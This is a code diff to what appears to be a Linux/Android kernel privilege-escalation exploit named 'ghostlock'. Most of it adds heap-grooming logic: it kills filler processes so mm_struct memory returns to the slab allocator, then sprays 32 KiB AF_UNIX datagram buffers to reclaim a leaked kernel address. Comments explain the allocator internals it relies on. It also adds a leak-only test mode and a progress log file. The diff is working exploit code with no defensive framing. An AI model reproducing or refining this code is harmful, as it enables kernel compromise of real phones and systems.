@@ -2,6 +2,7 @@
 #include "kernel/runtime_struct_offsets.h"
 
 #include <array>
+#include <linux/netlink.h>
 #include <string_view>
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
@@ -262,6 +263,24 @@ namespace ghostlock::support {
         return 1;
     }
 
+    void progress_marker(const char *tag) {
+        static const char *path = "/data/local/tmp/.gl_progress";
+        int32_t fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
+        if (fd < 0) {
+            return;
+        }
+        struct timespec now {};
+        clock_gettime(CLOCK_MONOTONIC, &now);
+        char line[96];
+        int32_t n = snprintf(line, sizeof(line), "%lld.%03ld %s\n",
+                             static_cast<long long>(now.tv_sec), now.tv_nsec / 1000000L, tag);
+        if (n > 0) {
+            (void) write(fd, line, static_cast<size_t>(n));
+        }
+        (void) fsync(fd);
+        (void) close(fd);
+    }
+
     pid_t clone_child(void) {
         pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
         if (child == 0) {
@@ -298,6 +317,19 @@ namespace ghostlock::support {
         }
         SYSCHK(kill(child, SIGKILL));
         SYSCHK(waitpid(child, nullptr, 0));
+    }
+
+    /* Bulk teardown: a filler may already be gone (SIGKILL raced, PDEATHSIG, or a
+     * previous attempt reaped it), and ESRCH must not abort the spray - the
+     * whole point is to get every mm_struct back to the slab allocator. */
+    void kill_child_quiet(pid_t child) {
+        if (child <= 0) {
+            return;
+        }
+        if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
+            pr_error("kill(%d): %m\n", child);
+        }
+        (void) waitpid(child, nullptr, 0);
     }
 
     void close_reclaim_sockets(void) {
@@ -655,6 +687,17 @@ namespace ghostlock::support {
         }
 
         uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
+        /* Diagnostic: stop right after a successful leak so table-size and
+     * collision parameters can be swept without arming the PI route. */
+        if (getenv("GL_LEAK_ONLY")) {
+            pr_info("[spray] GL_LEAK_ONLY: stopping after leak\n");
+            snitch.reset();
+            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
+                kill_child(prepare_ctx.childs[i]);
+            }
+            cleanup_page_prepare_state();
+            return 0;
+        }
         if (!prepare_skb_payload(base, request)) {
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
@@ -664,10 +707,27 @@ namespace ghostlock::support {
             return 0;
         }
 
+#if defined(GHOSTLOCK_VA39)
+        /* AF_UNIX SOCK_DGRAM goes through sock_alloc_send_skb(len) ->
+     * alloc_skb(len): one linear kmalloc(align64(len + 0x140)) with skb->data
+     * at offset 0.  len = 0x7ec0 therefore lands in kmalloc-32k - the same
+     * order as the mm_struct slab - while the stream variant caps the linear
+     * area at 0xec0 and only ever hands out order-0 frag pages
+     * (sock_alloc_send_pskb passes max_page_order 0). */
+        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, reclaim_sv.data()));
+#else
         SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
+#endif
         session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
+#if defined(GHOSTLOCK_VA39)
+        /* Each queued dgram pins one 32 KiB skb, so the send buffer bounds how
+     * many reclaim draws we get. */
+        int32_t sndbuf = 8 << 20;
+#else
         int32_t sndbuf = 1 << 20;
+#endif
         setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+        setsockopt(reclaim_sv[1], SOL_SOCKET, SO_RCVBUF, &sndbuf, sizeof(sndbuf));
         int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
         if (reclaim_flags >= 0) {
             fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
@@ -702,6 +762,29 @@ namespace ghostlock::support {
             SYSCHK(close(spray_ctx.memfds[i]));
             spray_ctx.memfds[i] = -1;
         }
+
+#if defined(GHOSTLOCK_VA39)
+        /* close(/proc/<pid>/mem) only drops mmgrab(); the paused filler still
+     * owns its mm, so nothing returns to the slab allocator and a 32 KiB skb
+     * can never land on `base`.  Take every filler down first, then spray. */
+        size_t freed = 0;
+        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
+            kill_child_quiet(pre_ctx.childs[i]);
+            pre_ctx.childs[i] = 0;
+            freed++;
+        }
+        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
+            kill_child_quiet(post_ctx.childs[i]);
+            post_ctx.childs[i] = 0;
+            freed++;
+        }
+        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
+            kill_child_quiet(spray_ctx.childs[i]);
+            spray_ctx.childs[i] = 0;
+            freed++;
+        }
+        pr_info("[spray] released %zu filler mms before the dgram spray\n", freed);
+#endif
 
         SYSCHK(close(pcp_shaping_sv[0]));
         SYSCHK(close(pcp_shaping_sv[1]));
